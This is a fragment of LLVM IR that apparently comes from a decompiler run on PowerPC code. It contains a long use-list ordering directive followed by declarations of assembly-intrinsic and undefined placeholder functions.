  uselistorder i32* @lr, { 12, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 676, 677, 678, 415, 419, 416, 417, 418, 423, 424, 420, 421, 422, 425, 426, 427, 428, 429, 13, 14, 15, 18, 16, 17, 430, 433, 431, 1, 432, 0, 434, 437, 438, 435, 436, 439, 440, 441, 442, 443, 444, 445, 446, 229, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 653, 683, 684, 685, 686, 679, 680, 681, 682, 471, 472, 476, 473, 474, 475, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 496, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 616, 230, 231, 232, 233, 511, 512, 513, 687, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 688, 689, 567, 528, 529, 654, 655, 698, 699, 703, 704, 705, 706, 707, 720, 722, 724, 700, 702, 318, 319, 320, 321, 322, 323, 324, 690, 696, 697, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 341, 19, 20, 351, 22, 352, 21, 23, 656, 658, 657, 659, 660, 661, 662, 663, 664, 340, 627, 497, 289, 343, 665, 591, 391, 67, 495, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 581, 582, 583, 584, 617, 585, 586, 587, 708, 709, 710, 711, 712, 715, 716, 717, 359, 530, 531, 532, 602, 603, 604, 605, 533, 579, 580, 606, 723, 721, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 10, 11, 551, 565, 566, 691, 692, 693, 694, 695, 718, 719, 344, 345, 346, 308, 619, 636, 701, 637, 713, 714, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 206, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 2, 207, 208, 209, 210, 211, 223, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 3, 224, 225, 226, 227, 228, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 250, 246, 247, 248, 249, 4, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 282, 280, 281, 5, 283, 284, 285, 286, 287, 288, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 309, 310, 311, 312, 313, 314, 315, 316, 317, 342, 347, 348, 349, 350, 6, 7, 8, 9, 353, 354, 355, 356, 357, 358, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 392, 393, 394, 395, 396, 397, 398, 588, 589, 590, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 607, 608, 609, 610, 611, 612, 613, 614, 615, 618, 620, 621, 622, 623, 624, 625, 626, 628, 629, 630, 631, 632, 633, 634, 635, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 666, 667, 668, 669, 670, 671, 673, 672, 674, 675 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare %1 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %2 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr
